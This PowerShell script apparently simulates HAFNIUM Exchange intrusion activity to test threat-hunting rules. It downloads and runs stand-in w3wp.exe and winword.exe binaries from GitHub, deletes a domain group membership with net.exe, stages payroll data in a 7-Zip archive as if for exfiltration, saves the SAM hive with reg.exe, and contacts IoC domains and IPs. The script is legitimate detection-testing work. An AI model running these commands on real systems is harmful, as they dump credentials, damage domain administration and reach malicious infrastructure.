# start HAFNIUM Simulation for testing the hunting rules
# some process if this is not the first time it execute
$processName2Kill = 'w3wp'
if ($processName2Kill) {
    $p = Get-Process | Where-Object {$_.ProcessName -match $processName2Kill} 
    if ($p) {
        Write-Host 'Process killed: ' $p.Name
        Stop-Process -Name $p.Name -Force
    } 
    else {Write-host "Process does not exist" $processName2Kill}
}
$processName2Kill = 'winword'
if ($processName2Kill) {
    $p = Get-Process | Where-Object {$_.ProcessName -match $processName2Kill} 
    if ($p) {
        Write-Host 'Process killed: ' $p.Name
        Stop-Process -Name $p.Name -Force
    } 
    else {Write-host "Process does not exist" $processName2Kill}
}

# create mandatory folder 
$inetsvr= "c:\windows\system32\inetsrv"
if ( -not (Test-Path -path $inetsvr )) {
    Write-Host $inetsvr "directory does not exist, let's create it"
    New-Item -Path $inetsvr -ItemType directory
    Write-Host "Create mandatory folder" $inetsvr
} else {
    Write-Host $inetsvr "exist, we are fine"
}

$aspnet= "C:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\Temporary ASP.NET Files"
if ( -not (Test-Path -path $aspnet )) {
    Write-Host $aspnet "directory does not exist, let's create it"
    New-Item -Path $aspnet -ItemType directory
    Write-Host "Create mandatory folder" $aspnet
} else {
    Write-Host $aspnet "exist, we are fine"
}

# download fake Exchange process
Write-Host "download fake Exchange process"
Invoke-WebRequest -Uri "https://github.com/girdav01/hunt-workshop/blob/main/v1/w3wp.exe?raw=true" -OutFile "c:\windows\system32\inetsrv\w3wp.exe"
Start-Process -FilePath c:\windows\system32\inetsrv\w3wp.exe
# run the command that delete Exchange admin group
Start-Process -FilePath net.exe -ArgumentList "group 'Exchange organization administrators' administrator /del /domain" -RedirectStandardOutput c:\output.txt -RedirectStandardError c:\errors.Log
# Download some fake data
$data= "c:\data"
if ( -not (Test-Path -path $data )) {
    Write-Host $data "directory does not exist, let's create it"
    New-Item -Path $data -ItemType directory
    Write-Host "Create mandatory folder" $data
} else {
    Write-Host $data "exist, we are fine"
}

Write-Host "Download payroll_data.csv"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/girdav01/hunt-workshop/main/v1/payroll_data.csv" -OutFile "c:\data\payroll_data.csv"
# 7zip usage to copy some exchage data before exfiltration

$7zipPath = "$env:ProgramFiles\7-Zip\7z.exe"

if (-not (Test-Path -Path $7zipPath -PathType Leaf)) {
    $Installer7Zip = $env:TEMP + "\7z1900-x64.msi"; 
    Write-Host "Installing 7zip"
    Invoke-WebRequest "https://www.7-zip.org/a/7z1900-x64.msi" -OutFile 
    $Installer7Zip; 
    msiexec /i $Installer7Zip /qb; 
    Remove-Item $Installer7Zip;
}

Set-Alias 7zip $7zipPath

$Source = "c:\data\payroll_data.csv"
$Target = "c:\data\payroll_data.zip"
Write-Host "Compressing csv into zip"
7zip a -mx=9 $Target $Source
# end of Hafnium demo

# more demos 

# some discovery commands
Write-Host "ipconfig.exe /all"
Start-Process -FilePath ipconfig.exe -ArgumentList '/All' -RedirectStandardOutput c:\output.txt -RedirectStandardError c:\errors.log

# download fake winword process that start a cmd.exe and powershell.exe for testing an analytic
Write-Host "download and run fake winword.exe that start cmd.exe and powershell.exe for analytic demo"
Invoke-WebRequest -Uri "https://github.com/girdav01/hunt-workshop/blob/main/v1/winword.exe?raw=true" -OutFile "c:\data\winword.exe"
Start-Process -FilePath c:\data\winword.exe

# credential dump
Write-Host "credential dump demo"
Start-Process -FilePath reg.exe -ArgumentList "save hklm\sam c:\temp\sam.save'" -RedirectStandardOutput c:\output.txt -RedirectStandardError c:\errors.log

# generate activity data for some AlienVault IoC's  https://otx.alienvault.com/pulse/5fd6df943558e0b56eaf3da8
Write-Host "Demo for AlienVault IoC's"
Start-Process -FilePath nslookup.exe -ArgumentList 'globalnetworkissues.com' -RedirectStandardOutput c:\output.txt -RedirectStandardError c:\errors.log
Start-Process -FilePath ping.exe -ArgumentList '204.188.205.176' -RedirectStandardOutput c:\output.txt -RedirectStandardError c:\errors.log
Start-Process -FilePath ping.exe -ArgumentList '5.252.177.25' -RedirectStandardOutput c:\output.txt -RedirectStandardError c:\errors.log
